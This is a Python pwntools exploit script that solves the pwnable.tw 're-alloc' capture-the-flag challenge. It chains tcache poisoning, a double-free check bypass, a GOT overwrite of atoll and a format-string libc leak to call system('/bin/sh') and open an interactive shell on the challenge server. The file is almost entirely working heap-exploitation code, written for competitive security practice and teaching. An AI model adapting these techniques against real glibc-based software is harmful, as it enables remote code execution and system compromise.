#!/usr/bin/env python3
from pwn import *

QWORD = 8
DUMMY = 0xdeadbeef
## There are a total of 2 heap allocation slot in .bss, accessed by the following index
OBJ0 = 0
OBJ1 = 1
PAD = lambda x: b"a" * x
polluted_size = set()

elf = ELF("./re-alloc_patched")
libc = ELF("./given/libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")
context.arch = "amd64"

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10106)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        gdb.attach(p, "\n".join([
                "b *0x40176d", # main()'s exit
            ]))


def alloc_data(index, size, data):
    assert(size < 0x79)
    p.sendlineafter(b"Your choice:", b"1")
    p.sendlineafter(b"Index:", str(index).encode())
    p.sendlineafter(b"Size", str(size).encode())
    p.sendafter(b"Data", data)


def realloc_data(index, size, data):
    assert(size < 0x79)
    p.sendlineafter(b"Your choice:", b"2")
    p.sendlineafter(b"Index:", str(index).encode())
    p.sendlineafter(b"Size:", str(size).encode())
    if size != 0:
        p.sendafter(b"Data:", data)


def free_data(index):
    realloc_data(index, 0, b"")
    p.recvuntil(b"alloc error")


def free_and_clear_data(index):
    p.sendlineafter(b"Your choice:", b"3")
    p.sendlineafter(b"Index:", str(index).encode())


def fmtstr_leak_libc():
    p.sendlineafter(b"Your choice:", b"1")
    p.sendlineafter(b"Index:", b"%9$p")
    leak_str = p.recvline()
    leak = int(leak_str, 16)
    log.info("libc leak:" + hex(leak))
    libc_base = leak + 0xda2000 - 0xf87760
    log.info("libc base:" + hex(libc_base))
    return libc_base

def tcache_poison(addr, size):
    """
    how2heap tcache poisoning:
    realloc() with big size and slightly larger size will have different effect.
    I experiment a lot to get this
    side effect: pollution on size (compilcated munipulation can probably cancel it.)
    """
    global polluted_size
    assert(not {size, size+0x10}.intersection(polluted_size))
    big_size = 0x70
    polluted_size = polluted_size.union({size, size+0x10, big_size})

    # tcache_poison
    alloc_data(OBJ0, size, p64(DUMMY))
    alloc_data(OBJ1, size, p64(DUMMY))
    free_and_clear_data(OBJ0)
    free_data(OBJ1)

    # realloc with the same size to write on the freed chunk
    realloc_data(OBJ1, size, p64(addr))

    # pop out the first (normal) heap chunk and discard it
    # KEY: reallocate it into a big_size chunk in order for NOT pushing it back to the tcache list
    alloc_data(OBJ0, size, p64(DUMMY))
    realloc_data(OBJ0, big_size, p64(DUMMY))
    free_and_clear_data(OBJ0)

    # KEY: realloc() with slightly bigger size to bypass double free check
    realloc_data(OBJ1, size + 0x10, p64(DUMMY))
    free_and_clear_data(OBJ1)
    log.info("Gaining 1 chance to overwrite at {}".format(hex(addr)))
    log.info("Polluted tcache size: {}".format([hex(x) for x in sorted(list(polluted_size))]))
    return [size, addr]


def tcache_arbit_write(chance, index, payload):
    size, addr = chance
    alloc_data(index, size, payload)
    log.info("Overwriting {} with size {} using ".format(hex(addr), hex(size)))


def tcache_arbit_write_printf_ctrl(chance, index, payload):
    """
    Once we overwrite atoll@got to printf@anything, we have to use printf to control argument
    We cannot seem to make printf() return 0, so we can only use OBJ1
    """
    assert(index == OBJ1)
    size, addr = chance
    assert(size < 0x79)
    p.sendlineafter(b"Your choice:", b"1")
    p.sendafter(b"Index:", "%{}c".format(index).encode())
    p.sendafter(b"Size", "%{}c".format(size).encode())
    p.sendafter(b"Data", payload)
    log.info("Overwriting {} with size {} using ".format(hex(addr), hex(size)))


def exploit():

    # prepare chances to do arbitrary write
    chance0 = tcache_poison(elf.got["atoll"], 0x20)
    chance1 = tcache_poison(elf.got["atoll"], 0x40)

    # first, change atoll to printf (for leaking)
    tcache_arbit_write(chance0, OBJ0, p64(elf.plt["printf"]))
    libc_base = fmtstr_leak_libc()
    libc.address = libc_base

    # then, change atoll to system
    # NOTE: we have to use printf return value to control the read_long() result now
    tcache_arbit_write_printf_ctrl(chance1, OBJ1, p64(libc.symbols["system"]))

    # system("/bin/sh")
    p.sendlineafter(b"Your choice:", b"3")
    p.sendlineafter(b"Index:", b"/bin/sh\x00")

    p.interactive()

if __name__ == "__main__":
    exploit()
